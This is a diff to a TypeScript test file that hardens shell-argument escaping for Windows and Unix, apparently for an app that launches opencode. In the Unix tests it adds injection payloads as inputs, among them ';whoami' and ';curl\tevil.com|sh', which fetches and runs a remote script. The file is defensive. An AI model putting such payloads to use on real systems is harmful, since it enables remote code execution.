@@ -80,14 +80,11 @@ describe('Shell escaping utilities', () => {
   });
 
   describe('Windows cmd.exe /s /c quoting (Issue #354)', () => {
-    // Reproduce the escapeShellArg + getShellArgs logic from the adapter
-    // to verify that paths with spaces are correctly quoted for cmd.exe /s /c.
+    // Reproduce the escapeShellArg + getShellArgs logic from the adapter.
+    // All arguments are now unconditionally quoted to prevent injection.
 
     function escapeShellArgWin32(arg: string): string {
-      if (arg.includes(' ') || arg.includes('"')) {
-        return `"${arg.replace(/"/g, '""')}"`;
-      }
-      return arg;
+      return `"${arg.replace(/"/g, '""')}"`;
     }
 
     function buildShellCommand(command: string, args: string[]): string {
@@ -107,29 +104,24 @@ describe('Shell escaping utilities', () => {
       const fullCommand = buildShellCommand(command, args);
       const shellArgs = getShellArgsWin32(fullCommand);
 
-      // shellArgs[2] must have outer quotes wrapping the entire command
       expect(shellArgs[2]).toBe(`"${fullCommand}"`);
-      // The inner path with spaces must still be individually quoted
       expect(fullCommand).toContain(
         '"C:\\Users\\Li Yao\\AppData\\Local\\Programs\\@accomplishdesktop\\opencode.exe"',
       );
-      // The full shell args should be ['/s', '/c', '"..."']
       expect(shellArgs[0]).toBe('/s');
       expect(shellArgs[1]).toBe('/c');
       expect(shellArgs[2].startsWith('"')).toBe(true);
       expect(shellArgs[2].endsWith('"')).toBe(true);
     });
 
-    it('should handle paths without spaces (no extra quoting needed on individual arg)', () => {
+    it('should always quote arguments even without spaces', () => {
       const command = 'C:\\Program\\opencode.exe';
       const args = ['run'];
       const fullCommand = buildShellCommand(command, args);
       const shellArgs = getShellArgsWin32(fullCommand);
 
-      // Path has no spaces so escapeShellArg does NOT add inner quotes
-      expect(fullCommand).toBe('C:\\Program\\opencode.exe run');
-      // But the outer quotes from getShellArgs are still applied
-      expect(shellArgs[2]).toBe('"C:\\Program\\opencode.exe run"');
+      expect(fullCommand).toBe('"C:\\Program\\opencode.exe" "run"');
+      expect(shellArgs[2]).toBe(`"${fullCommand}"`);
     });
 
     it('should handle multiple arguments with spaces', () => {
@@ -165,16 +157,61 @@ describe('Shell escaping utilities', () => {
   });
 
   describe('Unix shell escaping', () => {
-    it('should handle arguments with single quotes', () => {
-      // Single quotes need escaping on Unix
-      const argWithSingleQuote = "it's working";
-      expect(argWithSingleQuote.includes("'")).toBe(true);
+    // Reproduce the escapeShellArg logic from the adapter.
+    // All arguments are now unconditionally single-quoted to prevent injection.
+
+    function escapeShellArgUnix(arg: string): string {
+      return `'${arg.replace(/'/g, "'\\''")}'`;
+    }
+
+    function buildShellCommand(command: string, args: string[]): string {
+      const escapedCommand = escapeShellArgUnix(command);
+      const escapedArgs = args.map((arg) => escapeShellArgUnix(arg));
+      return [escapedCommand, ...escapedArgs].join(' ');
+    }
+
+    it('should always quote simple arguments', () => {
+      expect(escapeShellArgUnix('run')).toBe("'run'");
+      expect(escapeShellArgUnix('hello')).toBe("'hello'");
     });
 
-    it('should handle arguments with special characters', () => {
-      // Special shell characters need escaping
-      const argWithSpecial = 'echo $HOME';
-      expect(argWithSpecial.includes('$')).toBe(true);
+    it('should escape single quotes', () => {
+      expect(escapeShellArgUnix("it's working")).toBe("'it'\\''s working'");
+    });
+
+    it('should quote arguments with shell metacharacters', () => {
+      // These were previously unquoted and allowed shell injection
+      expect(escapeShellArgUnix(';whoami')).toBe("';whoami'");
+      expect(escapeShellArgUnix('foo|bar')).toBe("'foo|bar'");
+      expect(escapeShellArgUnix('foo&bar')).toBe("'foo&bar'");
+      expect(escapeShellArgUnix('foo>bar')).toBe("'foo>bar'");
+      expect(escapeShellArgUnix('foo<bar')).toBe("'foo<bar'");
+    });
+
+    it('should quote arguments with tab characters', () => {
+      // Tab (0x09) is an IFS word separator — must be quoted
+      expect(escapeShellArgUnix('foo\tbar')).toBe("'foo\tbar'");
+    });
+
+    it('should quote arguments that look like CLI flags', () => {
+      expect(escapeShellArgUnix('--version')).toBe("'--version'");
+      expect(escapeShellArgUnix('-v')).toBe("'-v'");
+      expect(escapeShellArgUnix('help')).toBe("'help'");
+    });
+
+    it('should prevent shell injection in full command', () => {
+      const command = '/usr/bin/opencode';
+      const args = ['run', '--format', 'json', ';curl\tevil.com|sh'];
+      const fullCommand = buildShellCommand(command, args);
+
+      // The injection payload must be inside single quotes
+      expect(fullCommand).toContain("';curl\tevil.com|sh'");
+      // The semicolon must NOT appear unquoted
+      expect(fullCommand).not.toMatch(/[^'\\];/);
+    });
+
+    it('should handle empty strings', () => {
+      expect(escapeShellArgUnix('')).toBe("''");
     });
   });
 });
